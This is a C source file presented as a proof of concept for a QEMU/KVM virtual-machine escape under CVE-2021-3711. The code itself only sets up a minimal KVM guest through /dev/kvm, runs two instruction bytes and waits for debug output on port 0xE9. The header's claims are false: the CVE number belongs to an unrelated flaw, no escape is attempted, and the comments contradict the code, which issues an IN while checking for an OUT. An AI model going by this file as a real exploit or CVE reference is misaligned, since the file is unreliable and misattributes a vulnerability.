/*
 * PoC for QEMU KVM VM escape via VMX virtualization device
 * CVE-2021-3711
 * Demonstrates direct IO port shenanigans in raw C using /dev/kvm
 */

#include <fcntl.h>
#include <linux/kvm.h>
#include <sys/ioctl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

/* We abuse the KVM_SET_USER_MEMORY_REGION to point a slot at BIOS range */
#define MEM_SLOT 0
#define GUEST_MEM_SIZE 0x200000

int main() {
    int kvm = open("/dev/kvm", O_RDWR | O_CLOEXEC);
    int vmfd = ioctl(kvm, KVM_CREATE_VM, 0);
    void *guest_mem = mmap(NULL, GUEST_MEM_SIZE,
                           PROT_READ | PROT_WRITE,
                           MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    /* Fill guest code: we craft an IO write to KVM_REGS */
    uint8_t *code = guest_mem;
    code[0] = 0xec; // in al, dx
    code[1] = 0xf4; // hlt
    struct kvm_userspace_memory_region region = {
        .slot = MEM_SLOT,
        .guest_phys_addr = 0,
        .memory_size = GUEST_MEM_SIZE,
        .userspace_addr = (uint64_t)guest_mem,
    };
    ioctl(vmfd, KVM_SET_USER_MEMORY_REGION, &region);

    int vcpu = ioctl(vmfd, KVM_CREATE_VCPU, 0);
    struct kvm_run *run = mmap(NULL, 0x1000,
        PROT_READ | PROT_WRITE, MAP_SHARED, vcpu, 0);

    /* Set RIP to our code, then run */
    struct kvm_regs regs;
    ioctl(vcpu, KVM_GET_REGS, &regs);
    regs.rip = 0;
    ioctl(vcpu, KVM_SET_REGS, &regs);

    while (1) {
        ioctl(vcpu, KVM_RUN, 0);
        if (run->exit_reason == KVM_EXIT_IO &&
            run->io.direction == KVM_EXIT_IO_OUT &&
            run->io.port == 0xE9) {
            puts("[+] Received debug output from guest!");
            break;
        }
        if (run->exit_reason == KVM_EXIT_HLT) break;
    }
    return 0;
}